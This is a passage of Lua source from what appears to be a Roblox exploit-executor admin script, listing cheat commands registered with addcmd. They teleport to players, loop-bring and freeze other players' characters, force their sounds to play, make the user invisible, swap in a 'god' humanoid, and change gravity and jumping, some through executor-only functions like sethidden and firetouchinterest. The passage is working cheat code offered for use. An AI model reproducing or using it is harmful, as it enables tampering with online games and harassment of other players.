		end)
	
		addcmd('copyappearanceid',{'caid'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				local aid = tostring(Players[v].CharacterAppearanceId)
				toClipboard(aid)
			end
		end)
	
		addcmd('norender',{},function(args, speaker)
			RunService:Set3dRenderingEnabled(false)
		end)
	
		addcmd('render',{},function(args, speaker)
			RunService:Set3dRenderingEnabled(true)
		end)
	
		addcmd('2022materials',{'use2022materials'},function(args, speaker)
			if sethidden then
				sethidden(MaterialService, "Use2022Materials", true)
			else
				notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
			end
		end)
	
		addcmd('un2022materials',{'unuse2022materials'},function(args, speaker)
			if sethidden then
				sethidden(MaterialService, "Use2022Materials", false)
			else
				notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
			end
		end)
	
		addcmd('goto',{'to'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				if Players[v].Character ~= nil then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)
				end
			end
			execCmd('breakvelocity')
		end)
	
		addcmd('tweengoto',{'tgoto','tto','tweento'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				if Players[v].Character ~= nil then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)}):Play()
				end
			end
			execCmd('breakvelocity')
		end)
	
		addcmd('vehiclegoto',{'vgoto','vtp','vehicletp'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				if Players[v].Character ~= nil then
					local seat = speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart
					local vehicleModel = seat:FindFirstAncestorWhichIsA("Model")
					vehicleModel:MoveTo(getRoot(Players[v].Character).Position)
				end
			end
		end)
	
		addcmd('pulsetp',{'ptp'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				if Players[v].Character ~= nil then
					local startPos = getRoot(speaker.Character).CFrame
					local seconds = args[2] or 1
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)
					wait(seconds)
					getRoot(speaker.Character).CFrame = startPos
				end
			end
			execCmd('breakvelocity')
		end)
	
		local vnoclipParts = {}
		addcmd('vehiclenoclip',{'vnoclip'},function(args, speaker)
			vnoclipParts = {}
			local seat = speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart
			local vehicleModel = seat.Parent
			repeat
				if vehicleModel.ClassName ~= "Model" then
					vehicleModel = vehicleModel.Parent
				end
			until vehicleModel.ClassName == "Model"
			wait(0.1)
			execCmd('noclip')
			for i,v in pairs(vehicleModel:GetDescendants()) do
				if v:IsA("BasePart") and v.CanCollide then
					table.insert(vnoclipParts,v)
					v.CanCollide = false
				end
			end
		end)
	
		addcmd("vehicleclip", {"vclip", "unvnoclip", "unvehiclenoclip"}, function(args, speaker)
			execCmd("clip")
			for i, v in pairs(vnoclipParts) do
				v.CanCollide = true
			end
			vnoclipParts = {}
		end)
	
		addcmd("togglevnoclip", {}, function(args, speaker)
			execCmd(Clip and "vnoclip" or "vclip")
		end)
	
		addcmd('clientbring',{'cbring'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				if Players[v].Character ~= nil then
					if Players[v].Character:FindFirstChildOfClass('Humanoid') then
						Players[v].Character:FindFirstChildOfClass('Humanoid').Sit = false
					end
					wait()
					getRoot(Players[v].Character).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(3,1,0)
				end
			end
		end)
	
		local bringT = {}
		addcmd('loopbring',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				task.spawn(function()
					if Players[v].Name ~= speaker.Name and not FindInTable(bringT, Players[v].Name) then
						table.insert(bringT, Players[v].Name)
						local plrName = Players[v].Name
						local pchar=Players[v].Character
						local distance = 3
						if args[2] and isNumber(args[2]) then
							distance = args[2]
						end
						local lDelay = 0
						if args[3] and isNumber(args[3]) then
							lDelay = args[3]
						end
						repeat
							for i,c in pairs(players) do
								if Players:FindFirstChild(v) then
									pchar = Players[v].Character
									if pchar~= nil and Players[v].Character ~= nil and getRoot(pchar) and speaker.Character ~= nil and getRoot(speaker.Character) then
										getRoot(pchar).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(distance,1,0)
									end
									wait(lDelay)
								else 
									for a,b in pairs(bringT) do if b == plrName then table.remove(bringT, a) end end
								end
							end
						until not FindInTable(bringT, plrName)
					end
				end)
			end
		end)
	
		addcmd('unloopbring',{'noloopbring'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				task.spawn(function()
					for a,b in pairs(bringT) do if b == Players[v].Name then table.remove(bringT, a) end end
				end)
			end
		end)
	
		local walkto = false
		local waypointwalkto = false
		addcmd('walkto',{'follow'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				if Players[v].Character ~= nil then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					walkto = true
					repeat wait()
						speaker.Character:FindFirstChildOfClass('Humanoid'):MoveTo(getRoot(Players[v].Character).Position)
					until Players[v].Character == nil or not getRoot(Players[v].Character) or walkto == false
				end
			end
		end)
	
		addcmd('pathfindwalkto',{'pathfindfollow'},function(args, speaker)
			walkto = false
			wait()
			local players = getPlayer(args[1], speaker)
			local hum = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			local path = PathService:CreatePath()
			for i,v in pairs(players)do
				if Players[v].Character ~= nil then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					walkto = true
					repeat wait()
						local success, response = pcall(function()
							path:ComputeAsync(getRoot(speaker.Character).Position, getRoot(Players[v].Character).Position)
							local waypoints = path:GetWaypoints()
							local distance 
							for waypointIndex, waypoint in pairs(waypoints) do
								local waypointPosition = waypoint.Position
								hum:MoveTo(waypointPosition)
								repeat 
									distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
									wait()
								until
								distance <= 5
							end	 
						end)
						if not success then
							speaker.Character:FindFirstChildOfClass('Humanoid'):MoveTo(getRoot(Players[v].Character).Position)
						end
					until Players[v].Character == nil or not getRoot(Players[v].Character) or walkto == false
				end
			end
		end)
	
		addcmd('pathfindwalktowaypoint',{'pathfindwalktowp'},function(args, speaker)
			waypointwalkto = false
			wait()
			local WPName = tostring(getstring(1))
			local hum = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			local path = PathService:CreatePath()
			if speaker.Character then
				for i,_ in pairs(WayPoints) do
					if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
						if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
							speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
							wait(.1)
						end
						local TrueCoords = Vector3.new(WayPoints[i].COORD[1], WayPoints[i].COORD[2], WayPoints[i].COORD[3])
						waypointwalkto = true
						repeat wait()
							local success, response = pcall(function()
								path:ComputeAsync(getRoot(speaker.Character).Position, TrueCoords)
								local waypoints = path:GetWaypoints()
								local distance 
								for waypointIndex, waypoint in pairs(waypoints) do
									local waypointPosition = waypoint.Position
									hum:MoveTo(waypointPosition)
									repeat 
										distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
										wait()
									until
									distance <= 5
								end
							end)
							if not success then
								speaker.Character:FindFirstChildOfClass('Humanoid'):MoveTo(TrueCoords)
							end
						until not speaker.Character or waypointwalkto == false
					end
				end
				for i,_ in pairs(pWayPoints) do
					if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
						if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
							speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
							wait(.1)
						end
						local TrueCoords = pWayPoints[i].COORD[1].Position
						waypointwalkto = true
						repeat wait()
							local success, response = pcall(function()
								path:ComputeAsync(getRoot(speaker.Character).Position, TrueCoords)
								local waypoints = path:GetWaypoints()
								local distance 
								for waypointIndex, waypoint in pairs(waypoints) do
									local waypointPosition = waypoint.Position
									hum:MoveTo(waypointPosition)
									repeat 
										distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
										wait()
									until
									distance <= 5
								end
							end)
							if not success then
								speaker.Character:FindFirstChildOfClass('Humanoid'):MoveTo(TrueCoords)
							end
						until not speaker.Character or waypointwalkto == false
					end
				end
			end
		end)
	
		addcmd('unwalkto',{'nowalkto','unfollow','nofollow'},function(args, speaker)
			walkto = false
			waypointwalkto = false
		end)
	
		addcmd("orbit", {}, function(args, speaker)
			execCmd("unorbit nonotify")
			local target = Players:FindFirstChild(getPlayer(args[1], speaker)[1])
			local root = getRoot(speaker.Character)
			local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			if target and target.Character and getRoot(target.Character) and root and humanoid then
				local rotation = 0
				local speed = tonumber(args[2]) or 0.2
				local distance = tonumber(args[3]) or 6
				orbit1 = RunService.Heartbeat:Connect(function()
					pcall(function()
						rotation = rotation + speed
						root.CFrame = CFrame.new(getRoot(target.Character).Position) * CFrame.Angles(0, math.rad(rotation), 0) * CFrame.new(distance, 0, 0)
					end)
				end)
				orbit2 = RunService.RenderStepped:Connect(function()
					pcall(function()
						root.CFrame = CFrame.new(root.Position, getRoot(target.Character).Position)
					end)
				end)
				orbit3 = humanoid.Died:Connect(function() execCmd("unorbit") end)
				orbit4 = humanoid.Seated:Connect(function(value) if value then execCmd("unorbit") end end)
				notify("Orbit", "Started orbiting " .. formatUsername(target))
			end
		end)
	
		addcmd("unorbit", {}, function(args, speaker)
			if orbit1 then orbit1:Disconnect() end
			if orbit2 then orbit2:Disconnect() end
			if orbit3 then orbit3:Disconnect() end
			if orbit4 then orbit4:Disconnect() end
			if args[1] ~= "nonotify" then notify("Orbit", "Stopped orbiting player") end
		end)
	
		addcmd('freeze',{'fr'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			if players ~= nil then
				for i,v in pairs(players) do
					task.spawn(function()
						for i, x in next, Players[v].Character:GetDescendants() do
							if x:IsA("BasePart") and not x.Anchored then
								x.Anchored = true
							end
						end
					end)
				end
			end
		end)
	
	
		addcmd('thaw',{'unfreeze','unfr'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			if players ~= nil then
				for i,v in pairs(players) do
					task.spawn(function()
						for i, x in next, Players[v].Character:GetDescendants() do
							if x.Name ~= floatName and x:IsA("BasePart") and x.Anchored then
								x.Anchored = false
							end
						end
					end)
				end
			end
		end)
	
		oofing = false
		addcmd('loopoof',{},function(args, speaker)
			oofing = true
			repeat wait(0.1)
				for i,v in pairs(Players:GetPlayers()) do
					if v.Character ~= nil and v.Character:FindFirstChild'Head' then
						for _,x in pairs(v.Character.Head:GetChildren()) do
							if x:IsA'Sound' then x.Playing = true end
						end
					end
				end
			until oofing == false
		end)
	
		addcmd('unloopoof',{},function(args, speaker)
			oofing = false
		end)
	
		local notifiedRespectFiltering = false
		addcmd('muteboombox',{},function(args, speaker)
			if not notifiedRespectFiltering and SoundService.RespectFilteringEnabled then notifiedRespectFiltering = true notify('RespectFilteringEnabled','RespectFilteringEnabled is set to true (the command will still work but may only be clientsided)') end
			local players = getPlayer(args[1], speaker)
			if players ~= nil then
				for i,v in pairs(players) do
					task.spawn(function()
						for i, x in next, Players[v].Character:GetDescendants() do
							if x:IsA("Sound") and x.Playing == true then
								x.Playing = false
							end
						end
						for i, x in next, Players[v]:FindFirstChildOfClass("Backpack"):GetDescendants() do
							if x:IsA("Sound") and x.Playing == true then
								x.Playing = false
							end
						end
					end)
				end
			end
		end)
	
		addcmd('unmuteboombox',{},function(args, speaker)
			if not notifiedRespectFiltering and SoundService.RespectFilteringEnabled then notifiedRespectFiltering = true notify('RespectFilteringEnabled','RespectFilteringEnabled is set to true (the command will still work but may only be clientsided)') end
			local players = getPlayer(args[1], speaker)
			if players ~= nil then
				for i,v in pairs(players) do
					task.spawn(function()
						for i, x in next, Players[v].Character:GetDescendants() do
							if x:IsA("Sound") and x.Playing == false then
								x.Playing = true
							end
						end
					end)
				end
			end
		end)
	
		addcmd("reset", {}, function(args, speaker)
			local humanoid = speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid")
			if replicatesignal then
				replicatesignal(speaker.Kill)
			elseif humanoid then
				humanoid:ChangeState(Enum.HumanoidStateType.Dead)
			else
				speaker.Character:BreakJoints()
			end
		end)
	
		addcmd('freezeanims',{},function(args, speaker)
			local Humanoid = speaker.Character:FindFirstChildOfClass("Humanoid") or speaker.Character:FindFirstChildOfClass("AnimationController")
			local ActiveTracks = Humanoid:GetPlayingAnimationTracks()
			for _, v in pairs(ActiveTracks) do
				v:AdjustSpeed(0)
			end
		end)
	
		addcmd('unfreezeanims',{},function(args, speaker)
			local Humanoid = speaker.Character:FindFirstChildOfClass("Humanoid") or speaker.Character:FindFirstChildOfClass("AnimationController")
			local ActiveTracks = Humanoid:GetPlayingAnimationTracks()
			for _, v in pairs(ActiveTracks) do
				v:AdjustSpeed(1)
			end
		end)
	
		addcmd("respawn", {}, function(args, speaker)
			respawn(speaker)
		end)
	
		addcmd("refresh", {"re"}, function(args, speaker)
			refresh(speaker)
		end)
	
		addcmd("god", {}, function(args, speaker)
			permadeath(speaker)
			local Cam = workspace.CurrentCamera
			local Char, Pos = speaker.Character, Cam.CFrame
			local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
			local nHuman = Human:Clone()
			nHuman.Parent = char
			speaker.Character = nil
			nHuman:SetStateEnabled(15, false)
			nHuman:SetStateEnabled(1, false)
			nHuman:SetStateEnabled(0, false)
			nHuman.BreakJointsOnDeath = true
			Human:Destroy()
			speaker.Character = char
			Cam.CameraSubject = nHuman
			Cam.CFrame = task.wait() and pos
			nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
			local Script = Char:FindFirstChild("Animate")
			if Script then
				Script.Disabled = true
				task.wait()
				Script.Disabled = false
			end
			nHuman.Health = nHuman.MaxHealth
		end)
	
		invisRunning = false
		addcmd('invisible',{'invis'},function(args, speaker)
			if invisRunning then return end
			invisRunning = true
			-- Full credit to AmokahFox @V3rmillion
			local Player = speaker
			repeat wait(.1) until Player.Character
			local Character = Player.Character
			Character.Archivable = true
			local IsInvis = false
			local IsRunning = true
			local InvisibleCharacter = Character:Clone()
			InvisibleCharacter.Parent = Lighting
			local Void = workspace.FallenPartsDestroyHeight
			InvisibleCharacter.Name = ""
			local CF
	
			local invisFix = RunService.Stepped:Connect(function()
				pcall(function()
					local IsInteger
					if tostring(Void):find'-' then
						IsInteger = true
					else
						IsInteger = false
					end
					local Pos = Player.Character.HumanoidRootPart.Position
					local Pos_String = tostring(Pos)
					local Pos_Seperate = Pos_String:split(', ')
					local X = tonumber(Pos_Seperate[1])
					local Y = tonumber(Pos_Seperate[2])
					local Z = tonumber(Pos_Seperate[3])
					if IsInteger == true then
						if Y <= Void then
							Respawn()
						end
					elseif IsInteger == false then
						if Y >= Void then
							Respawn()
						end
					end
				end)
			end)
	
			for i,v in pairs(InvisibleCharacter:GetDescendants())do
				if v:IsA("BasePart") then
					if v.Name == "HumanoidRootPart" then
						v.Transparency = 1
					else
						v.Transparency = .5
					end
				end
			end
	
			function Respawn()
				IsRunning = false
				if IsInvis == true then
					pcall(function()
						Player.Character = Character
						wait()
						Character.Parent = workspace
						Character:FindFirstChildWhichIsA'Humanoid':Destroy()
						IsInvis = false
						InvisibleCharacter.Parent = nil
						invisRunning = false
					end)
				elseif IsInvis == false then
					pcall(function()
						Player.Character = Character
						wait()
						Character.Parent = workspace
						Character:FindFirstChildWhichIsA'Humanoid':Destroy()
						TurnVisible()
					end)
				end
			end
	
			local invisDied
			invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
				Respawn()
				invisDied:Disconnect()
			end)
	
			if IsInvis == true then return end
			IsInvis = true
			CF = workspace.CurrentCamera.CFrame
			local CF_1 = Player.Character.HumanoidRootPart.CFrame
			Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
			workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
			wait(.2)
			workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
			InvisibleCharacter = InvisibleCharacter
			Character.Parent = Lighting
			InvisibleCharacter.Parent = workspace
			InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
			Player.Character = InvisibleCharacter
			execCmd('fixcam')
			Player.Character.Animate.Disabled = true
			Player.Character.Animate.Disabled = false
	
			function TurnVisible()
				if IsInvis == false then return end
				invisFix:Disconnect()
				invisDied:Disconnect()
				CF = workspace.CurrentCamera.CFrame
				Character = Character
				local CF_1 = Player.Character.HumanoidRootPart.CFrame
				Character.HumanoidRootPart.CFrame = CF_1
				InvisibleCharacter:Destroy()
				Player.Character = Character
				Character.Parent = workspace
				IsInvis = false
				Player.Character.Animate.Disabled = true
				Player.Character.Animate.Disabled = false
				invisDied = Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
					Respawn()
					invisDied:Disconnect()
				end)
				invisRunning = false
			end
			notify('Invisible','You now appear invisible to other players')
		end)
	
		addcmd("visible", {"vis","uninvisible"}, function(args, speaker)
			TurnVisible()
		end)
	
		addcmd("toggleinvis", {}, function(args, speaker)
			execCmd(invisRunning and "visible" or "invisible")
		end)
	
		addcmd('toolinvisible',{'toolinvis','tinvis'},function(args, speaker)
			local Char  = Players.LocalPlayer.Character
			local touched = false
			local tpdback = false
			local box = Instance.new('Part')
			box.Anchored = true
			box.CanCollide = true
			box.Size = Vector3.new(10,1,10)
			box.Position = Vector3.new(0,10000,0)
			box.Parent = workspace
			local boxTouched = box.Touched:connect(function(part)
				if (part.Parent.Name == Players.LocalPlayer.Name) then
					if touched == false then
						touched = true
						local function apply()
							local no = Char.HumanoidRootPart:Clone()
							wait(.25)
							Char.HumanoidRootPart:Destroy()
							no.Parent = Char
							Char:MoveTo(loc)
							touched = false
						end
						if Char then
							apply()
						end
					end
				end
			end)
			repeat wait() until Char
			local cleanUp
			cleanUp = Players.LocalPlayer.CharacterAdded:connect(function(char)
				boxTouched:Disconnect()
				box:Destroy()
				cleanUp:Disconnect()
			end)
			loc = Char.HumanoidRootPart.Position
			Char:MoveTo(box.Position + Vector3.new(0,.5,0))
		end)
	
		addcmd("strengthen", {}, function(args, speaker)
			for _, child in pairs(speaker.Character:GetDescendants()) do
				if child.ClassName == "Part" then
					if args[1] then
						child.CustomPhysicalProperties = PhysicalProperties.new(args[1], 0.3, 0.5)
					else
						child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
					end
				end
			end
		end)
	
		addcmd("weaken", {}, function(args, speaker)
			for _, child in pairs(speaker.Character:GetDescendants()) do
				if child.ClassName == "Part" then
					if args[1] then
						child.CustomPhysicalProperties = PhysicalProperties.new(-args[1], 0.3, 0.5)
					else
						child.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
					end
				end
			end
		end)
	
		addcmd("unweaken", {"unstrengthen"}, function(args, speaker)
			for _, child in pairs(speaker.Character:GetDescendants()) do
				if child.ClassName == "Part" then
					child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
				end
			end
		end)
	
		addcmd("breakvelocity", {}, function(args, speaker)
			local BeenASecond, V3 = false, Vector3.new(0, 0, 0)
			delay(1, function()
				BeenASecond = true
			end)
			while not BeenASecond do
				for _, v in ipairs(speaker.Character:GetDescendants()) do
					if v:IsA("BasePart") then
						v.Velocity, v.RotVelocity = V3, V3
					end
				end
				wait()
			end
		end)
	
		addcmd('jpower',{'jumppower','jp'},function(args, speaker)
			local jpower = args[1] or 50
			if isNumber(jpower) then
				if speaker.Character:FindFirstChildOfClass('Humanoid').UseJumpPower then
					speaker.Character:FindFirstChildOfClass('Humanoid').JumpPower = jpower
				else
					speaker.Character:FindFirstChildOfClass('Humanoid').JumpHeight  = jpower
				end
			end
		end)
	
		addcmd("maxslopeangle", {"msa"}, function(args, speaker)
			local sangle = args[1] or 89
			if isNumber(sangle) then
				speaker.Character:FindFirstChildWhichIsA("Humanoid").MaxSlopeAngle = sangle
			end
		end)
	
		addcmd("gravity", {"grav"}, function(args, speaker)
			local grav = args[1] or 196.2
			if isNumber(grav) then
				workspace.Gravity = grav
			end
		end)
	
		addcmd("hipheight", {"hheight"}, function(args, speaker)
			local hipHeight = args[1] or (r15(speaker) and 2.1 or 0)
			if isNumber(hipHeight) then
				speaker.Character:FindFirstChildWhichIsA("Humanoid").HipHeight = hipHeight
			end
		end)
	
		addcmd("dance", {}, function(args, speaker)
			pcall(execCmd, "undance")
			local dances = {"27789359", "30196114", "248263260", "45834924", "33796059", "28488254", "52155728"}
			if r15(speaker) then
				dances = {"3333432454", "4555808220", "4049037604", "4555782893", "10214311282", "10714010337", "10713981723", "10714372526", "10714076981", "10714392151", "11444443576"}
			end
			local animation = Instance.new("Animation")
			animation.AnimationId = "rbxassetid://" .. dances[math.random(1, #dances)]
			danceTrack = speaker.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(animation)
			danceTrack.Looped = true
			danceTrack:Play()
		end)
	
		addcmd("undance", {"nodance"}, function(args, speaker)
			danceTrack:Stop()
			danceTrack:Destroy()
		end)
	
		addcmd('nolimbs',{'rlimbs'},function(args, speaker)
			if r15(speaker) then
				for i,v in pairs(speaker.Character:GetChildren()) do
					if v:IsA("BasePart") and
						v.Name == "RightUpperLeg" or
						v.Name == "LeftUpperLeg" or
						v.Name == "RightUpperArm" or
						v.Name == "LeftUpperArm" then
						v:Destroy()
					end
				end
			else
				for i,v in pairs(speaker.Character:GetChildren()) do
					if v:IsA("BasePart") and
						v.Name == "Right Leg" or
						v.Name == "Left Leg" or
						v.Name == "Right Arm" or
						v.Name == "Left Arm" then
						v:Destroy()
					end
				end
			end
		end)
	
		addcmd('noarms',{'rarms'},function(args, speaker)
			if r15(speaker) then
				for i,v in pairs(speaker.Character:GetChildren()) do
					if v:IsA("BasePart") and
						v.Name == "RightUpperArm" or
						v.Name == "LeftUpperArm" then
						v:Destroy()
					end
				end
			else
				for i,v in pairs(speaker.Character:GetChildren()) do
					if v:IsA("BasePart") and
						v.Name == "Right Arm" or
						v.Name == "Left Arm" then
						v:Destroy()
					end
				end
			end
		end)
	
		addcmd('nolegs',{'rlegs'},function(args, speaker)
			if r15(speaker) then
				for i,v in pairs(speaker.Character:GetChildren()) do
					if v:IsA("BasePart") and
						v.Name == "RightUpperLeg" or
						v.Name == "LeftUpperLeg" then
						v:Destroy()
					end
				end
			else
				for i,v in pairs(speaker.Character:GetChildren()) do
					if v:IsA("BasePart") and
						v.Name == "Right Leg" or
						v.Name == "Left Leg" then
						v:Destroy()
					end
				end
			end
		end)
	
		addcmd("sit", {}, function(args, speaker)
			speaker.Character:FindFirstChildWhichIsA("Humanoid").Sit = true
		end)
	
		addcmd("lay", {"laydown"}, function(args, speaker)
			local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			humanoid.Sit = true
			task.wait(0.1)
			humanoid.RootPart.CFrame = humanoid.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
			for _, v in ipairs(humanoid:GetPlayingAnimationTracks()) do
				v:Stop()
			end
		end)
	
		addcmd("sitwalk", {}, function(args, speaker)
			local anims = speaker.Character.Animate
			local sit = anims.sit:FindFirstChildWhichIsA("Animation").AnimationId
			anims.idle:FindFirstChildWhichIsA("Animation").AnimationId = sit
			anims.walk:FindFirstChildWhichIsA("Animation").AnimationId = sit
			anims.run:FindFirstChildWhichIsA("Animation").AnimationId = sit
			anims.jump:FindFirstChildWhichIsA("Animation").AnimationId = sit
			speaker.Character:FindFirstChildWhichIsA("Humanoid").HipHeight = not r15(speaker) and -1.5 or 0.5
		end)
	
		addcmd("nosit", {}, function(args, speaker)
			speaker.Character:FindFirstChildWhichIsA("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, false)
		end)
	
		addcmd("unnosit", {}, function(args, speaker)
			speaker.Character:FindFirstChildWhichIsA("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		end)
	
		addcmd("jump", {}, function(args, speaker)
			speaker.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
		end)
	
		local infJump
		infJumpDebounce = false
		addcmd("infjump", {"infinitejump"}, function(args, speaker)
			if infJump then infJump:Disconnect() end
			infJumpDebounce = false
			infJump = UserInputService.JumpRequest:Connect(function()
				if not infJumpDebounce then
					infJumpDebounce = true
					speaker.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
					wait()
					infJumpDebounce = false
				end
			end)
		end)
	
		addcmd("uninfjump", {"uninfinitejump", "noinfjump", "noinfinitejump"}, function(args, speaker)
			if infJump then infJump:Disconnect() end
			infJumpDebounce = false
		end)
	
		local flyjump
		addcmd("flyjump", {}, function(args, speaker)
			if flyjump then flyjump:Disconnect() end
			flyjump = UserInputService.JumpRequest:Connect(function()
				speaker.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
			end)
		end)
	
		addcmd("unflyjump", {"noflyjump"}, function(args, speaker)
			if flyjump then flyjump:Disconnect() end
		end)
	
		local HumanModCons = {}
		addcmd('autojump',{'ajump'},function(args, speaker)
			local Char = speaker.Character
			local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
			local function autoJump()
				if Char and Human then
					local check1 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position-Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
					local check2 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position+Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
					if check1 or check2 then
						Human.Jump = true
					end
				end
			end
			autoJump()
			HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or RunService.RenderStepped:Connect(autoJump)
			HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
				Char, Human = nChar, nChar:WaitForChild("Humanoid")
				autoJump()
				HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or RunService.RenderStepped:Connect(autoJump)
			end)
		end)
	
		addcmd('unautojump',{'noautojump', 'noajump', 'unajump'},function(args, speaker)
			HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or nil
			HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or nil
		end)
	
		addcmd('edgejump',{'ejump'},function(args, speaker)
			local Char = speaker.Character
			local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
			-- Full credit to NoelGamer06 @V3rmillion
			local state
			local laststate
			local lastcf
			local function edgejump()
				if Char and Human then
					laststate = state
					state = Human:GetState()
					if laststate ~= state and state == Enum.HumanoidStateType.Freefall and laststate ~= Enum.HumanoidStateType.Jumping then
						Char.HumanoidRootPart.CFrame = lastcf
						Char.HumanoidRootPart.Velocity = Vector3.new(Char.HumanoidRootPart.Velocity.X, Human.JumpPower or Human.JumpHeight, Char.HumanoidRootPart.Velocity.Z)
					end
					lastcf = Char.HumanoidRootPart.CFrame
				end
			end
			edgejump()
			HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or RunService.RenderStepped:Connect(edgejump)
			HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
				Char, Human = nChar, nChar:WaitForChild("Humanoid")
				edgejump()
				HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or RunService.RenderStepped:Connect(edgejump)
			end)
		end)
	
		addcmd('unedgejump',{'noedgejump', 'noejump', 'unejump'},function(args, speaker)
			HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or nil
			HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or nil
		end)
	
		addcmd("team", {}, function(args, speaker)
			local teamName = getstring(1)
			local team = nil
			local root = speaker.Character and getRoot(speaker.Character)
			for _, v in ipairs(Teams:GetChildren()) do
				if v.Name:lower():match(teamName:lower()) then
					team = v
					break
				end
			end
			if not team then
				return notify("Invalid Team", teamName .. " is not a valid team")
			end
			if root and firetouchinterest then
				for _, v in ipairs(workspace:GetDescendants()) do
